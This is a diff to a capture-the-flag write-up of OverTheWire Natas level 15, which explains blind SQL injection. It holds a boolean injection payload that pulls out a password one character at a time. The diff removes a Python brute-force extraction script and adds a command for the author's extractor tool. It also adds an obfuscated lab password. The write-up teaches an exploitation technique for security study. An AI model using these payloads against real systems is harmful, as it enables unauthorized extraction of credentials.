@@ -1,8 +1,8 @@
 # Write-up: Natas 15 → 16  
-**Date:** 2025-12-26  
+**Date:** 2025-12-28  
 
 ## Obfuscated password (ROT13)  
-``
+`uCxwXLivYDpgRJ33DzhKY6rQIsZJ4fTb`
 
 ---
 
@@ -14,9 +14,9 @@
 
 ## PURPOSE
 
-This level teaches a critical web security concept: **blind SQL injection**. Unlike previous SQLi challenges that echo query results directly, this level returns only a binary answer (“This user exists” or “This user doesn't exist”) — meaning we must infer data through **true/false conditions**.
+This level demonstrates a **blind SQL injection scenario.* Unlike earlier levels, the application does not output database results directly. Instead, it only indicates whether a query returned *any* rows.
 
-It demonstrates the risk of unsafe string concatenation in SQL statements and reinforces the importance of proper sanitization and parameterized queries.
+By observing this binary response, it becomes possible to infer sensitive information one character at a time.
 
 ---
 
@@ -35,44 +35,43 @@ The key trick is that if the `SELECT` query returns any rows, the app tells us �
 We send a crafted input like:
 
 ```
-natas16" AND BINARY SUBSTRING(password,1,1)="a" #
+natas16" AND BINARY SUBSTRING(password,1,1)="a" --
 ```
 
 If the first character of the password is `'a'`, the query evaluates to true, and we get confirmation. Otherwise, we try another character.
 
-Using this idea, we brute-force the password character by character. A Python script automates this:
+Using this idea, we brute-force the password character by character. I automated the process with my reusable script [`blind_sqli_extractor.py` (stored under my `cyber_journal/experiments/` tooling)](https://github.com/jeremyrayjewell/cyber_journal/tree/main/experiments/blind_sqli_extractor).
 
-```python
-import requests
-from string import ascii_letters, digits
+Command used to extract the Natas16 password:
 
-charset = ascii_letters + digits
-url = "http://natas15.natas.labs.overthewire.org/"
-auth = ("natas15", "YOUR_PASSWORD_HERE")  # Replace with real credentials
-
-found = ""
-while len(found) < 32:
-    for char in charset:
-        injection = f'natas16" AND BINARY SUBSTRING(password,{len(found)+1},1)="{char}" #'
-        r = requests.post(url, auth=auth, data={"username": injection})
-        if "This user exists" in r.text:
-            found += char
-            print(f"[+] {len(found)} chars: {found}")
-            break
+```bash
+python3 blind_sqli_extractor.py \
+  --url "http://natas15.natas.labs.overthewire.org/" \
+  --user natas15 \
+  --password <NATAS15_PASSWORD> \
+  --param username \
+  --true-string "This user exists" \
+  --max-length 32
 ```
 
-- The script tests all letters and digits in `charset`.
-- The `BINARY` keyword ensures case sensitivity.
-- It halts after 32 characters, which is the known password length.
+- The script iterates through a known character set (letters and digits).
+- The `BINARY` keyword enforces case sensitivity.
+- It advances position-by-position until the full 32-character password is recovered.
 
 Once complete, the password for `natas16` is revealed.
+
 
 ---
 
 ## TAKEAWAYS
 
----
+- Blind SQL injection does not require visible query output  
+- Boolean responses are sufficient to extract sensitive data  
+- Parameterized queries completely prevent this vulnerability  
+- Automation is essential for practical exploitation  
+
+___
 
 Writeup author: **Jeremy Ray Jewell**  
-GitHub: https://github.com/jeremyrayjewell  
-LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
+[GitHub](https://github.com/jeremyrayjewell)  
+[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
